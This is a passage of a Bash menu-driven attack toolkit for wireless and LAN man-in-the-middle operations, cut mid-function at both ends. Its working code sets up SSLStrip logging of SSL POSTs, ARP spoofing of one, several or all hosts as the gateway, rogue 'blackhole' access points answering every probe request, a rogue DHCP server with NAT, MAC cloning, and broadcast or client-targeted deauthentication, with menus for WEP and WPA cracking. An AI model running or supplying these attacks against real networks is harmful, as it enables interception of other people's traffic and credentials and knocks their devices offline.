		2) echo -e "\033[36m\nDefine Log Name"
		read sstrip_log
		strip_em_II--;;

		3) echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --Define Logging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Log only SSL POSTs (default)

2) Log all SSL traffic TO and FROM server

3) Log all SSL and HTTP traffic TO and FROM server\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read log_opt
		case $log_opt in
			1) log_opt="-p" ;;
			2) log_opt="-s" ;;
			3) log_opt="-a" ;;
 			*) log_opt= ;; ## Nulled
		esac

		strip_em_II--;;

		4) echo -e "\033[36m\nFake a Favicon? (y or n)"
		read lck_fav
		case $lck_fav in
			y|Y) lck_fav="Yes" ;;
			n|N) lck_fav="No" ;;
			*) lck_fav= ;; ## Nulled
		esac

		strip_em_II--;;

		5) echo -e "\033[36m\nKill Present Sessions? (y or n)"
		read ses_kil
		case $ses_kil in
			y|Y) ses_kil="Yes" ;;
			n|N) ses_kil="No" ;;
			*) ses_kil= ;; ## Nulled
		esac

		strip_em_II--;;

		6) echo -e "\033[36m\nCreate a Tail of the SSLStrip Log? (y or n)"
		read ssl_tail
		case $ssl_tail in
			y|Y) ssl_tail="Yes" ;;
			n|N) ssl_tail="No" ;;
			*) ssl_tail= ;; ## Nulled
		esac

		strip_em_II--;;

		7) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			sleep 1
			strip_em_II--
		else
			strip_em_III--
		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) strip_em_II--;;
	esac
	}

strip_em_II--
}

arpspoof--()
{

	mass_arp--()
	{
	if [[ $arp_way == "yes" ]];then
		while [ "$1" != "" ];do
			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
			xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
			shift
		done

	else
		while [ "$1" != "" ];do
			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
			shift 
		done

	fi
	}

var_II= ## Nulled
var_III= ## Nulled
var_IV= ## Nulled
spoof_dev= ## Device to spoof with
gt_way= ## Gateway IP variable
tgt_ip= ## Tgt IP variable
mult_tgts= ## Variable to assign multiple IPs with
arp_way= ## Variable to define Two-Way spoofing with multiple IPs
clear
while [ -z $spoof_dev ];do
	echo -e "\033[36m\nDevice to Spoof with?"
	read spoof_dev
	dev_check_var=$spoof_dev
	dev_check--
	if [[ $dev_check == "fail" ]];then
		spoof_dev= ## Nulled
	fi

done

while [ -z $gt_way ];do
	echo -e "\033[36m\nDefine Gateway IP Address (Who Are We Pretending to Be?)"
	read gt_way
done

while [[ $var_II != "x" ]];do
	echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~
--ArpSpoof Tgts--
~~~~~~~~~~~~~~~~~\033[36m
(E)verybody 
(M)ultiple Tgts
(S)ingle Tgt\033[1;34m
~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		e|E) var_II="x"
		xterm -bg black -fg grey -title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
		atk_menu--;;

		m|M) var_II="x"
		while [[ -z $mult_tgts ]];do
			echo -e "\033[36m\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
			read mult_tgts
		done

		while [ -z $var_IV ];do
			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
			read var_IV
			case $var_IV in
				y|Y) arp_way="yes"
				mass_arp-- $mult_tgts
				atk_menu--;;

				n|N) mass_arp-- $mult_tgts
				atk_menu--;;

				*) var_IV= ;; ## Nulled
			esac

		done;;

		s|S) var_II="x"
		while [ -z $tgt_ip ];do
			echo -e "\033[36m\nDefine Target IP address (Who Are we Lying to?)"
			read tgt_ip
		done

		while [[ $var_III != x ]]; do
			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
			read var
			case $var in 
				y|Y) var_III="x"
				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
				xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
				atk_menu--;;

				n|N) var_III="x"
				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
				atk_menu--;;

				*) var_III= ;; ## Nulled
			esac

		done;;

		*) var_II= ;; ## Nulled
	esac

done
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~ BEGIN routing-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
ipt_--()
{
## The basic premise behind this function is to have a basic overview and flush capability for iptables.
## It is in no way to be an all encompassing tool.
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~
IPTABLES Configurations
~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) List Tables

2) Flush Tables

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~\n"
read var 
case $var in
	1) clear
	echo -e "\033[1;33m"
	iptables-save | egrep -v "Generated by|COMMIT|Completed on"
	echo -e "\033[1;32m\nPress Enter to Continue"
	read
	ipt_--;;

	2) ipt_flush--;;

	p|P) routing--;;

	m|M) main_menu--;;

	*) ipt_--;;
esac
}

k_for--()
{
clear
echo -e "\033[1;33m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Current ip_forward status is `cat /proc/sys/net/ipv4/ip_forward`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Turn ON Kernel Forwarding

2) Turn OFF Kernel Forwarding

P)revious Menu

M)ain Menu\033[1;33m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) echo "1" > /proc/sys/net/ipv4/ip_forward
	k_for--;;

	2) echo "0" > /proc/sys/net/ipv4/ip_forward
	k_for--;;

	p|P) routing--;;

	m|M) main_menu--;;

	*) k_for--;;
esac
}

dhcp_pre_var--()
{
dhcp_dev="at0" ## Device to setup DHCP server on
sas="192.168.10.0" ## DHCP Subnet 
sair="192.168.10.100 192.168.10.200" ## DHCP IP range
dhcp_tail="Yes" ## DHCP Tail Log
dns_cus="No" ## Use custom DNS entries for DHCP server, defaulted to nameservers in /etc/resolv.conf
}

dhcp_svr--()
{
var= ## Nulled
dhcp_svr_stat= ## Variable for Cleanup Purposes..
DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3

	dhcp_func--()
	{

		custom_dns--()
		{
		while [ "$1" != "" ];do
			for sadns in $1;do
				echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
			done

			shift
		done
		}

	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              --DHCP Server Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) DHCP Server Device  [\033[1;33m$dhcp_dev\033[36m]

2) Gateway IP Address  [\033[1;33m$sapip\033[36m]

3) Subnet Mask         [\033[1;33m$sasm\033[36m]

4) Subnet              [\033[1;33m$sas\033[36m]

5) IP Range            [\033[1;33m$sair\033[36m]

6) Custom DNS Entries  [\033[1;33m$sair\033[36m]

7) Tail DHCP Log       [\033[1;33m$dhcp_tail\033[36m]

8) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nDHCP Server Device?"
		read dhcp_dev
		dev_check_var=$dhcp_dev
		dev_check--
		if [[ -z $dev_check ]];then
			dhcp_func--
		else
			dhcp_dev= ## Nulled
			dhcp_func----
		fi;;

		2) echo -e "\033[36m\nGateway IP Address?"
		read sapip
		dhcp_func--;;

		3) echo -e "\033[36m\nSubnet Mask?"
		read sasm
		dhcp_func--;;

		4) echo -e "\033[36m\nSubnet?"
		read sas
		dhcp_func--;;

		5) echo -e "\033[36m\nIP Range?"
		read sair
		dhcp_func--;;

		6) echo -e "\033[36m\nCreate a Tail of the DHCP Log? (y or n)"
		read dhcp_tail
		case $dhcp_tail in
			y|Y) dhcp_tail="Yes" ;;
			n|N) dhcp_tail="No" ;;
			*) dhcp_tail= ;; ## Nulled
		esac

		dhcp_func--;;

		7) echo -e "\033[36m\nCreate Custom DNS Entries? (y or n)"
		read dns_cus
		case $dns_cus in
			y|Y) echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
			read dns_entry ;;

			n|N) dns_cus="No" ;;

			*) dns_cus= ;; ## Nulled
		esac

		dhcp_func--;;

		8) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair || -z $dhcp_tail || -z $dns_cus ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			sleep 1
			dhcp_func--
		fi;;

		p|P) routing--;;

		m|M) main_menu--;;

		*) dhcp_func--;;
	esac

	## Clear any dhcp leases that might have been left behind
	echo > /var/lib/dhcp3/dhcpd.leases
	## Empty the file to start clean
	cat /dev/null > /tmp/dhcpd.conf
	## start dhcpd daemon with special configuration file
	echo -e "\033[1;33mGenerating /tmp/dhcpd.conf"
	echo "default-lease-time 3600;">> /tmp/dhcpd.conf
	echo "max-lease-time 7200;" >> /tmp/dhcpd.conf
	echo "ddns-update-style none;" >> /tmp/dhcpd.conf
	echo "authoritative;" >> /tmp/dhcpd.conf
	echo "log-facility local7;" >> /tmp/dhcpd.conf
	echo "subnet $sas netmask $sasm {" >> /tmp/dhcpd.conf
	echo "range $sair;" >> /tmp/dhcpd.conf
	echo "option routers $sapip;" >> /tmp/dhcpd.conf
## Old messy way of doing things
# 	for sadns in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
## Cleaner way of doing things
	if [[ $dns_cus == "No" ]];then
		for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
			echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
		done
	else
		custom_dns-- $dns_entry
	fi

	echo "}"  >> /tmp/dhcpd.conf
	}

	dhcp_svr_II--()
	{
	echo -e "\033[1;33m"
	##Gives dhcpd the permissions it needs
	mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd
	dhcpd3 -cf $DHCPDCONF -pf /var/run/dhcpd/dhcpd.pid $dhcp_dev &
	dhcp_svr_stat="active"
	if [ $? -ne 0 ];then
		echo -e "\033[31mThe DHCP server could not be started\nPress Enter to Return to Routing Features"
		read
		routing--
	else
		route add -net $sas netmask $sasm gw $sapip
		iptables -P FORWARD ACCEPT
		case $rte_choice in
			3|5) iptables -t nat -A POSTROUTING -o $IE -j MASQUERADE;;
		esac

		case $dhcp_tail in
			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail /var/lib/dhcp3/dhcpd.leases" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
		esac

		echo -e "\033[1;33m\n\n\n\nDHCP server started succesfully\n\n"
		sleep 3
		echo -e "\033[1;32m\n\n\n\nPress Enter to Return to Routing Features"
		read
		routing--
	fi
	}

if [ -e $DHCPDCONF ] ; then
	while [ -z $var ];do
		echo -e "\033[31m\nDHCP Server Configuration File Exists\033[36m\n
Create New File [\033[31mDeleting /tmp/dhcpd.conf\033[36m] (y or n)?"
		read var
		case $var in
			y|Y) dhcp_func--
			dhcp_svr_II--;;

			n|N) echo > /var/lib/dhcp3/dhcpd.leases ## Clear any dhcp leases that might have been left behind
			dhcp_svr_II--;;

			*) var= ;; ## Nulled
		esac

	done

else
	dhcp_func--
	dhcp_svr_II--
fi
}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~~~ BEGIN routing-- shared sub-functions ~~~~~~~~~~~~~~~~~~##
ap_pre_var--()
{
sapip="192.168.10.1" ## SoftAP IP Address
sasm="255.255.255.0" ## SoftAP Subnet Mask
sac=6 ## SoftAP Channel
mtu_size=1400 ## MTU Size
dhcp_autol="Yes" ## DHCP Autolaunch for speed and intensity purposes
ap_check="on" ## Variable to make sure these pre-variables are called if DHCP server is done prior to SoftAP
}

ap_setup--()
{

	var_meth--()
	{
	clear
	BB= ## Nulled
	while [ -z $BB ];do
		echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
               --Method Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) blackhole--> Responds to All Probe Requests

2) bullzeye--> Responds only to the specified ESSID\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read BB
	done

	case $BB in
		1|2) ap--;;
		*) var_meth--;;
	esac
	}

clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        --Soft AP Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) SoftAP Physical Device [\033[1;33m$phys_dev\033[36m] \033[31m(Not The Monitor Mode Device Name)\033[36m

2) SoftAP IP Address      [\033[1;33m$sapip\033[36m]

3) SoftAP Subnet Mask     [\033[1;33m$sasm\033[36m]

4) SoftAP Channel         [\033[1;33m$sac\033[36m]

5) MTU Size               [\033[1;33m$mtu_size\033[36m]

6) DHCP Server Autolaunch [\033[1;33m$dhcp_autol\033[36m]

7) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
case $var in
	1) echo -e "\033[36m\nSoftAP Physical Device?"
	read phys_dev
	dev_check_var=$phys_dev
	dev_check--
	if [[ -z $dev_check ]];then
		ap_setup--
	else
		phys_dev= ## Nulled
		ap_setup--
	fi;;

	2) echo -e "\033[36m\nSoftAP IP Address?"
	read sapip
	ap_setup--;;

	3) echo -e "\033[36m\nSoftAP Subnet Mask?"
	read sasm
	ap_setup--;;

	4) echo -e "\033[36m\nSoftAP Channel?"
	read sac
	case $sac in
		1|2|3|4|5|6|7|8|9|10|11) ;;
		*) sac= ;; ## Nulled
	esac

	ap_setup--;;

	5) echo -e "\033[36m\nDesired MTU Size?"
	read mtu_size
	ap_setup--;;

	6) echo -e "\033[36m\nAutolaunch DHCP Server? (y or n)"
	read dhcp_autol
	case $dhcp_autol in
		y|Y) dhcp_autol="Yes" ;;
		n|N) dhcp_autol="No" ;;
		*) dhcp_autol= ;; ## Nulled
	esac

	ap_setup--;;

	7) if [[ -z $phys_dev || -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
		echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
		sleep 1
		ap_setup--
	fi;;

	p|P) routing--;;

	m|M) main_menu--;;

	*) ap_setup--;;
esac

if [[ $private == "yes" ]]; then
	BB="3"
	ap--
else
	var_meth--
fi
}

ap--()
{
#pres_mac= ## MAC Address for the SoftAP
pres_mac=`ifconfig $phys_dev | awk '{print $5}'`
pres_mac=`echo $pres_mac | awk '{print $1}'`
#blackhole targets every single probe request on current channel
modprobe tun
if [ $BB == "1" ]; then
	xterm -bg black -fg grey -sb -rightbar -title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
	clear
## bullzeye targets specified ESSID only
elif [ $BB == "2" ]; then
	SSID= ## Nulled
	while [ -z $SSID ];do
		echo -e "\033[36m\nDesired ESSID?"
		read SSID
	done

	xterm -bg black -fg grey -sb -rightbar -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
	clear
elif [ $BB == "3" ];then
	private= ## Nulled
	SSID= ## Nulled
	while  [ -z $SSID ];do
		echo -e "\033[36m\nDesired ESSID?"
		read SSID
	done

	var= ## Nulled
	while [ -z $var ];do
		echo -e "\033[36m\nUse WEP? (y or n)"
		read var
	done

	case $var in
		y|Y) echo -e "\033[36m\nPassword? (a-f, 0-9) [10 Characters]"
		read wep_pword
		xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" -w $wep_pword $pii &
		clear;;

		n|N) xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" $pii & ;;

		*) ap--;;
	esac
fi

# give enough time before next command for interface to come up
# Intended to prevent errors on Virtual Machines with USB cards
echo -e "\033[1;33mConfiguring Devices.............."
sleep 7
macchanger -m $pres_mac at0
ifconfig at0 up $sapip netmask $sasm
ifconfig at0 mtu $mtu_size

if [[ $dhcp_autol == "Yes" ]];then
	dhcp_pre_var--
	dhcp_svr--
else
	routing--
fi
}
##~~~~~~~~~~~~~~~~~~~~~~~ END routing-- shared sub-functions ~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~ END routing-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~ BEGIN in-depth sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~ BEGIN ipt_-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
ipt_flush--()
{
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~
  --Flush IPTABLES--
~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Filter Tables

2) NAT Tables

3) Mangle Tables

4) Raw Tables

5) Flush All 4 Tables

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~\n"
read var
clear
case $var in
	1) iptables -t filter --flush
	echo -e "\033[1;33m"
	iptables-save -t filter | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	2) iptables -t nat --flush
	echo -e "\033[1;33m"
	iptables-save -t nat | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	3) iptables -t mangle --flush
	echo -e "\033[1;33m"
	iptables-save -t mangle | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	4) iptables -t raw --flush
	echo -e "\033[1;33m"
	iptables-save -t raw | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	5) iptables -t filter --flush
	iptables -t nat --flush
	iptables -t mangle --flush
	iptables -t raw --flush
	echo -e "\033[1;33m"
	iptables-save | egrep -v "Generated by|COMMIT|Completed on"
	sleep 3
	ipt_flush--;;

	p|P) ipt_--;;
	
	m|M) main_menu--;;
	
	*) ipt_flush--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~ END ipt_-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~ END in-depth sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
wifi_101--()
{
trap trap_101-- INT

##~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##
	tchan--()
	{
	tc= ## tgt channel
	while [ -z $tc ];do
		echo -e "\033[36m\nTgt Channel? (1-11)"
		read tc
### Need to learn to case within range...Also learn if within range (with sanitization) [1-11]???
		case $tc in
			1|2|3|4|5|6|7|8|9|10|11) ;;
			*) tc= ## Nulled
		esac

	done

	case $parent_IV in
		dump) dump--;;
	esac

	case $parent_III in
		rtech) parent_III= ## Nulled to prevent repeat looping that is NOT wanted!
		rtech_II--;;
	esac

	case $parent_VI in
		ctech) ctech_II--;;
	esac

	case $parent_VII in
		WPA) parent_VII= ## Nulled to prevent repeat looping that is NOT wanted!
		WPA_II--;;
	esac
	}

	cfile--()
	{
	cf= ## capture file name
	while [ -z $cf ];do
		echo -e "\033[36m\nCapture File Name?"
		read cf
	done

	case $parent_IV in
		dump) dump--;;
	esac

	case $parent_V in
		crack) crack--;;
	esac

## Yes, the next couple lines are lazy, I will eventually create cfile_III--(), right now, I am just pushing to get this new version out.
	case $parent_VI in
		ctech) parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
		xterm -bg black -fg grey -sb -rightbar -title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
		sleep 2;;
	esac
	}

	st_1--()
	{
	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	clear
	}

	wpa_warn--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**********************************************************
             .....BEFORE PROCEEDING..... 
                  ...MAKE SURE...

  IF YOU ELECTED TO DO THE PRELIMINARY AIRODUMP-NG SCAN
YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION

..........UNDESIRED RESULTS MAY OCCUR OTHERWISE...........
**********************************************************

            ****PRESS ENTER TO CONTINUE****

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read
	sleep .7
	}
##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~ BEGIN Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~##
	venue--()
	{
	parent= ## Nulled
	parent_VII= ## Nulled
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --WiFi 101 Venue Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Scan Channels

2) Airodump Capture

3) De-Authentications

4) Fake Authentications

5) Router-Based WEP Attacks

6) Packet Forging

7) Forged Packet Injection

8) Client-Based WEP Attacks

9) Crack WEP .pcap

0) WPA Attacks

L)ist the Steps needed to Crack WEP

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) sc=1-11 ## Channels to scan on
		hop=1500 ## time between channel hops
		wifi_scan--;;

		2) b= ## tgt bssid
		tc= ## Nulled
		cf= ## Nulled
		of=pcap ## Output Format for Airodump-NG
		parent="venue"
		dump--;;

		3) wifi_deauth--;;

		4) 	ska_xor= ## Variable for file used w/ SKA injection
		hid_essid= ## Variable for hidden ESSID
		sm= ## source mac
		rd=10 ## reauthentication delay
		ppb=1 ## Re-authentication packets per burst
		kaf=3 ## keep-alive frequency
		parent="venue"
		auth--;;

		5) parent="venue" 
		rtech--;;

		6) parent="venue"
		pforge--;;

		7) parent="venue"
		forge_out--;;

		8) parent="venue"
		ctech--;;

		9) parent="venue"
		crack--;;

		0) parent_VII="WPA"
		WPA--;;

		l|L) lists--;;

		m|M) main_menu--;;

		*) venue--;;
	esac
	}
##~~~~~~~~~~~~~~~~~~~~~ END Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~##
	wifi_scan--()
	{
	#wifi_ias_pid= ##PID for initial Airodump-NG scan
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --Channel Scanning Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Specified Channels [\033[1;33m$sc\033[36m]

2) Hop Frequency (ms) [\033[1;33m$hop\033[36m]

3) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
		read sc
		wifi_scan--;;

		2) echo -e "\033[36m\nHop Frequency in milliseconds?"
		read hop
		wifi_scan--;;

		3) if [[ -z $sc || -z $hop ]];then
			echo -e "\033[31mYou Must Enter the Channels and Hop to Proceed"
			read
			wifi_scan--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) wifi_scan--;;
	esac

	xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
	venue--
	}

	dump--()
	{
	parent_IV= ## Nulled
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        --Capture Session Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt Channel      [\033[1;33m$tc\033[36m]

2) BSSID {Optional} [\033[1;33m$b\033[36m]

3) File Name        [\033[1;33m$cf\033[36m]

4) Output Format    [\033[1;33m$of\033[36m]

5) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) parent_IV="dump" 
		tchan--
		iwconfig $pii channel $tc;;

		2) echo -e "\033[36m\nTgt BSSID? (Leave Blank to Null)"
		read b
		dump--;;

		3) parent_IV="dump" 
		cfile--;;

		4) of= ## Nulled
		while [ -z $of ];do
			echo -e "\033[36m\nOutput Format? (pcap, ivs, csv, gps, kismet, netxml)"
			read of
			case $of in
				pcap|ivs|csv|gps|kismet|netxml) ;;
				*) of= ;; ## Nulled
			esac

		done

		dump--;;

		5) if [[ -z $tc || -z $cf || -z $of ]];then
			echo -e "\033[31mTgt Channel & File Name & Output-Format Must be Filled Before Proceeding"
			sleep 1
			dump--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) dump--;;
	esac

	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	if [[ -z $b ]];then
		xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
	else
		xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf BSSID: $b Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
	fi

	venue--
	}

	wifi_deauth--()
	{
	sc= ## Wireless channel to deauth on
	rb= ## Router BSSID
	#wifi_dea_pid= ## Deauth Scan PID

		wifi_deauth_II--()
		{
		dt= ## DeAuth Type
		cm= ## Client MAC

			wifi_switch_deauth--()
			{
			kill -9 $wifi_dea_pid
			sc= ## Nulled
			while [ -z $sc ];do
				echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
				read sc
			done

			hop= ## Nulled
			while [ -z $hop ];do	
				echo -e "\033[36m\nMilliseconds between channel hops?"
				read hop
			done

			xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
			sleep .7
			wifi_deauth--
			}

			wifi_deauth_III--()
			{
			r_d= ## Repeat DeAuth Variable
			while [ -z $r_d ];do
				echo -e "\033[36m\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth" 
				read r_d
			done

			case $r_d in
				r|R) 	case $dt in
						b|B) echo -e "\033[1;33m" 
						aireplay-ng $pii -0 3 -a $rb
						wifi_deauth_III--;;

						c|C) echo -e "\033[1;33m" 
						aireplay-ng $pii -0 3 -a $rb -c $cm
						wifi_deauth_III--;;
					esac;;

				c|C) clear 
				wifi_deauth_II--;;

				s|S) wifi_switch_deauth--;;

				e|E) venue--;;

				*) wifi_deauth_III--;;
			esac
			}

		while [ -z $dt ];do
			echo -e "\033[36m\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
			read dt
		done

		case $dt in
			b|B) echo -e "\033[1;33m" 
			aireplay-ng $pii -0 4 -a $rb
			wifi_deauth_III--;;

			c|C) while [ -z $cm ];do
				echo -e "\033[36m\nClient MAC address?"
				read cm
			done

			echo -e "\033[1;33m"
			aireplay-ng $pii -0 4 -a $rb -c $cm
			wifi_deauth_III--;;

			s|S) wifi_switch_deauth--;;

			e|E) venue--;;

			*) wifi_deauth_II--;;
		esac
		}

	clear
	while [ -z $sc ];do
		echo -e "\033[36m\nSpecified Channel? (1-11) {choose only one channel}"
		read sc
		case $sc in
